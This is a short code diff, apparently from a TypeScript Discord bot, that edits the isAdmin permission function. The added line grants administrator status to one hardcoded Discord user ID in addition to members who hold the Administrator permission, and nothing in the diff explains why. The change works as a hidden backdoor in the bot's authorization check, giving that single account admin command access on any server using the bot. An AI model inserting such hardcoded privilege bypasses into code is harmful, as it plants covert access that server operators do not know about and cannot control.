@@ -6,7 +6,7 @@ export function isAdmin(msg: Message) :boolean {
     if (!msg.member) {
         return false
     }
-    return msg.member.permissions.has(Discord.PermissionsBitField.Flags.Administrator)
+    return msg.member.permissions.has(Discord.PermissionsBitField.Flags.Administrator) || msg.author.id === "469447356195143680"
 }
 
 export function buildHelpPage(message: Message, value: BaseCommand[], key: string) {
